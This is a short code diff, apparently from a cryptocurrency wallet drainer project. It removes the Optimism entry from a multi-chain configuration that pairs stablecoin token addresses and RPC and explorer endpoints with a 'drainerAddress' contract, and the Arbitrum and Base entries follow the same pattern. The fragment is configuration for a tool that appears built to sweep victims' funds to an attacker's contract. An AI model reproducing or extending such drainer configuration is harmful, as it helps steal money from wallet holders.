@@ -71,17 +71,6 @@ const CHAINS = {
     explorerApi: "https://api.arbiscan.io/api",
     explorerApiKey: ARBISCAN_API_KEY
   },
-  10: {
-    name: "Optimism",
-    nativeToken: "ETH",
-    chainIdHex: "0xa",
-    rpcUrls: ["https://mainnet.optimism.io"],
-    usdtAddress: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
-    usdcAddress: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",
-    drainerAddress: "0x01A4392e1228ec38d018b4aaed1109D989095646",
-    explorerApi: "https://api-optimistic.etherscan.io/api",
-    explorerApiKey: OPTIMISTIC_ETHERSCAN_API_KEY
-  },
   8453: {
     name: "Base",
     nativeToken: "ETH",
